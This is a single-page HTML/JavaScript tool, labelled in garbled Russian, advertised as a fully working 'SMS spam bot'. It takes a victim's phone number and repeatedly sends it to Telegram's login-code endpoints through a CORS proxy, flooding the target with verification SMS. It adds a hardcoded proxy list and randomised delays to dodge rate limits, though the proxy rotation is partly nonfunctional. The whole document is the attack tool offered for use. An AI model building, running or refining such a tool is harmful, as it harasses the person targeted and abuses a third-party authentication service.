<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>üî• SMS SPAM BOT - Full Working</title>
    <style>
        body {
            background: #0a0a0a;
            color: white;
            font-family: monospace;
            padding: 20px;
            margin: 0;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
            border: 2px solid #ff3838;
            padding: 20px;
            background: #111;
        }
        
        h1 {
            color: #ff3838;
            text-align: center;
            margin-bottom: 30px;
        }
        
        .input-group {
            margin: 20px 0;
        }
        
        input, select, button {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            background: #222;
            color: white;
            border: 1px solid #ff3838;
            font-size: 16px;
        }
        
        button {
            background: #ff3838;
            color: black;
            font-weight: bold;
            cursor: pointer;
        }
        
        button:hover {
            background: #ff4757;
        }
        
        .status {
            background: #222;
            padding: 15px;
            margin: 10px 0;
            border-left: 4px solid #ff3838;
        }
        
        .proxy-item {
            padding: 5px;
            border-bottom: 1px solid #333;
            font-size: 12px;
        }
        
        .success { color: #00ff00; }
        .error { color: #ff3838; }
        .warning { color: #ffff00; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üî• SMS SPAM BOT</h1>
        
        <div class="input-group">
            <input type="text" id="phone" placeholder="–ù–æ–º–µ—Ä: +79991234567" />
            <select id="count">
                <option value="10">10 SMS</option>
                <option value="20">20 SMS</option>
                <option value="50">50 SMS</option>
                <option value="100">100 SMS</option>
                <option value="200">200 SMS</option>
            </select>
            <button onclick="startAttack()">üöÄ –ù–ê–ß–ê–¢–¨ –ê–¢–ê–ö–£</button>
            <button onclick="stopAttack()" style="background:#333">‚èπÔ∏è –û–°–¢–ê–ù–û–í–ò–¢–¨</button>
        </div>
        
        <div id="status" class="status">
            –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∏ –Ω–∞–∂–º–∏—Ç–µ "–ù–ê–ß–ê–¢–¨ –ê–¢–ê–ö–£"
        </div>
        
        <div id="proxies" style="max-height: 200px; overflow-y: scroll; background:#111; padding:10px;">
            <div class="proxy-item">üîç –ü—Ä–æ–≤–µ—Ä—è—é –ø—Ä–æ–∫—Å–∏...</div>
        </div>
    </div>

<script>
// ==================== –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ====================
const PROXIES = [
    "95.174.67.50:18080",
    "185.94.218.57:8080", 
    "188.130.129.9:8080",
    "5.161.98.204:80",
    "103.152.112.145:80",
    "45.8.146.162:80",
    "194.28.31.109:80",
    "91.245.75.97:8080",
    "95.217.62.36:3128",
    "138.68.60.8:8080"
];

const TARGETS = [
    'https://oauth.telegram.org/auth/request',
    'https://my.telegram.org/auth/send_password'
];

// ==================== –ü–ï–†–ï–ú–ï–ù–ù–´–ï ====================
let workingProxies = [];
let attackActive = false;
let sentCount = 0;
let successCount = 0;

// ==================== –û–°–ù–û–í–ù–´–ï –§–£–ù–ö–¶–ò–ò ====================

// –ó–∞–ø—É—Å–∫ –∞—Ç–∞–∫–∏
async function startAttack() {
    const phone = document.getElementById('phone').value.trim();
    const count = parseInt(document.getElementById('count').value);
    
    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–æ–º–µ—Ä–∞
    const normalized = normalizePhone(phone);
    if (!normalized) {
        updateStatus('‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞!', 'error');
        return;
    }
    
    if (workingProxies.length === 0) {
        await checkProxies();
        if (workingProxies.length === 0) {
            updateStatus('‚ùå –ù–µ—Ç —Ä–∞–±–æ—á–∏—Ö –ø—Ä–æ–∫—Å–∏!', 'error');
            return;
        }
    }
    
    updateStatus(`üöÄ –ê—Ç–∞–∫–∞ –Ω–∞—á–∞—Ç–∞: ${normalized} (${count} SMS)`, 'success');
    attackActive = true;
    sentCount = 0;
    successCount = 0;
    
    // –ó–∞–ø—É—Å–∫–∞–µ–º –∞—Ç–∞–∫—É
    for (let i = 0; i < count && attackActive; i++) {
        await sendSMS(normalized, i);
        sentCount++;
        
        // –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç—É—Å –∫–∞–∂–¥—ã–µ 5 –æ—Ç–ø—Ä–∞–≤–æ–∫
        if (sentCount % 5 === 0) {
            updateStatus(
                `üì§ –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: ${sentCount}/${count}<br>` +
                `‚úÖ –£—Å–ø–µ—à–Ω—ã—Ö: ${successCount}<br>` +
                `üîÑ –ü—Ä–æ–∫—Å–∏: ${workingProxies.length} —Ä–∞–±–æ—á–∏—Ö`,
                'warning'
            );
        }
        
        // –ó–∞–¥–µ—Ä–∂–∫–∞ 1-3 —Å–µ–∫—É–Ω–¥—ã
        await sleep(Math.random() * 2000 + 1000);
    }
    
    updateStatus(
        `‚úÖ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!<br>` +
        `üì® –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: ${sentCount} SMS<br>` +
        `‚úÖ –£—Å–ø–µ—à–Ω—ã—Ö: ${successCount}<br>` +
        `‚ùå –ù–µ—É–¥–∞—á–Ω—ã—Ö: ${sentCount - successCount}`,
        'success'
    );
}

// –û—Ç–ø—Ä–∞–≤–∫–∞ –æ–¥–Ω–æ–≥–æ SMS
async function sendSMS(phone, attempt) {
    if (workingProxies.length === 0) return false;
    
    const proxy = workingProxies[Math.floor(Math.random() * workingProxies.length)];
    const target = TARGETS[attempt % TARGETS.length];
    
    try {
        // –§–æ—Ä–º–∏—Ä—É–µ–º –∑–∞–ø—Ä–æ—Å
        const formData = new URLSearchParams();
        formData.append('phone', phone);
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —á–µ—Ä–µ–∑ CORS –ø—Ä–æ–∫—Å–∏
        const corsProxy = 'https://cors-anywhere.herokuapp.com/';
        const response = await fetch(corsProxy + target, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            body: formData
        });
        
        const success = response.ok;
        if (success) successCount++;
        
        // –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç—É—Å –ø—Ä–æ–∫—Å–∏
        updateProxyStatus(proxy, success);
        
        return success;
        
    } catch (error) {
        updateProxyStatus(proxy, false);
        return false;
    }
}

// –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–æ–∫—Å–∏
async function checkProxies() {
    updateStatus('üîç –ü—Ä–æ–≤–µ—Ä—è—é –ø—Ä–æ–∫—Å–∏...', 'warning');
    workingProxies = [];
    const proxyList = document.getElementById('proxies');
    proxyList.innerHTML = '';
    
    for (let proxy of PROXIES) {
        const isWorking = await testProxy(proxy);
        const item = document.createElement('div');
        item.className = 'proxy-item';
        item.innerHTML = isWorking ? 
            `‚úÖ ${proxy}` : 
            `‚ùå ${proxy}`;
        proxyList.appendChild(item);
        
        if (isWorking) {
            workingProxies.push(proxy);
        }
        
        await sleep(500); // –ó–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –ø—Ä–æ–≤–µ—Ä–∫–∞–º–∏
    }
    
    updateStatus(`‚úÖ –†–∞–±–æ—á–∏—Ö –ø—Ä–æ–∫—Å–∏: ${workingProxies.length}/${PROXIES.length}`, 'success');
}

// –¢–µ—Å—Ç –ø—Ä–æ–∫—Å–∏
async function testProxy(proxy) {
    try {
        const corsProxy = 'https://cors-anywhere.herokuapp.com/';
        const response = await fetch(corsProxy + 'http://httpbin.org/ip', {
            timeout: 5000
        });
        return response.ok;
    } catch {
        return false;
    }
}

// –ù–æ—Ä–º–∞–ª–∏–∑–∞—Ü–∏—è –Ω–æ–º–µ—Ä–∞
function normalizePhone(phone) {
    phone = phone.replace(/\D/g, '');
    
    if (phone.length === 10 && phone.startsWith('9')) {
        phone = '7' + phone;
    } else if (phone.length === 11 && phone.startsWith('8')) {
        phone = '7' + phone.substring(1);
    }
    
    if (phone.length === 11 && phone.startsWith('7')) {
        return '+' + phone;
    }
    
    return null;
}

// ==================== –í–°–ü–û–ú–û–ì–ê–¢–ï–õ–¨–ù–´–ï –§–£–ù–ö–¶–ò–ò ====================

function updateStatus(message, type) {
    const status = document.getElementById('status');
    status.innerHTML = message;
    status.className = `status ${type}`;
}

function updateProxyStatus(proxy, success) {
    const items = document.querySelectorAll('.proxy-item');
    items.forEach(item => {
        if (item.textContent.includes(proxy)) {
            item.innerHTML = success ? 
                `‚úÖ ${proxy} - –†–∞–±–æ—Ç–∞–µ—Ç` : 
                `‚ùå ${proxy} - –ù–µ —Ä–∞–±–æ—Ç–∞–µ—Ç`;
        }
    });
}

function stopAttack() {
    attackActive = false;
    updateStatus('‚èπÔ∏è –ê—Ç–∞–∫–∞ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞', 'warning');
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// ==================== –ó–ê–ü–£–°–ö ====================

// –ê–≤—Ç–æ–ø—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–æ–∫—Å–∏ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
window.onload = function() {
    checkProxies();
};

// –ê–≤—Ç–æ–∑–∞–ø—É—Å–∫ –ø–æ Enter
document.getElementById('phone').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') startAttack();
});
</script>
</body>
</html>
